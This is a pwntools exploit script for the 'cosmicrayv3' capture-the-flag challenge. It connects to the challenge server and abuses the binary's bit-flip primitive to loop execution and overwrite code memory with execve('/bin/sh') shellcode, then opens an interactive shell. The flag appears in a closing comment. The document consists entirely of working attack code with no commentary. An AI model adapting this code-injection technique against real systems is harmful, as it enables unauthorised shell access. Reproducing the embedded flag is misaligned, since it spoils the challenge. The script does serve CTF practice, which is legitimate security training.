#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./cosmicrayv3_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc vsc.tf 7000"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()
    
    r.recvuntil(b":")
    r.sendline(bstr(hex(0x4015aa))) #achieve persistence
    r.recvuntil(b":")
    r.sendline(b"0")

    def zero(addr):
        r.recvuntil(b":")
        r.sendline(bstr(hex(addr)))
        r.recvuntil(b"-\n")
        b = (r.recvline(False)[1:-1].decode()).split("|")
        r.recvuntil(b":")
        r.sendline(b"0")
        r.recvuntil(b":")
        r.sendline(bstr(hex(addr)))
        r.recvuntil(b":")
        r.sendline(b"0")
        
        for idx, i in enumerate(b):
            if i=="0":
                continue
            r.recvuntil(b":")
            r.sendline(bstr(hex(addr)))
            r.recvuntil(b":")
            r.sendline(bstr(idx))

    def write(addr, value):
        for idx, i in enumerate(p64(value)):
            print("aint dead")
            zero(addr+idx)
            b = (bin(i)[2:]).rjust(8, "0")

            for idx2, j in enumerate(b):
                if j=="0":
                    continue
                r.recvuntil(b":")
                r.sendline(bstr(hex(addr+idx)))
                r.recvuntil(b":")
                r.sendline(bstr(idx2))
    
    
    shellcode = asm("""
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    mov rax, 59
    xor rdx, rdx
    xor rsi, rsi
    syscall
    """)


    for i in range(0, len(shellcode), 8):
        write(0x4015e5+i, u64(shellcode[i:i+8].ljust(8, b"\x90")))

    r.sendline(bstr(hex(0x4015aa))) #remove persistence and ret to our shellcode
    r.sendline(b"0")
    r.interactive()
    #vsctf{4nd_th3_st4r5_4l1gn_0nc3_m0r3}

if __name__ == "__main__":
    main()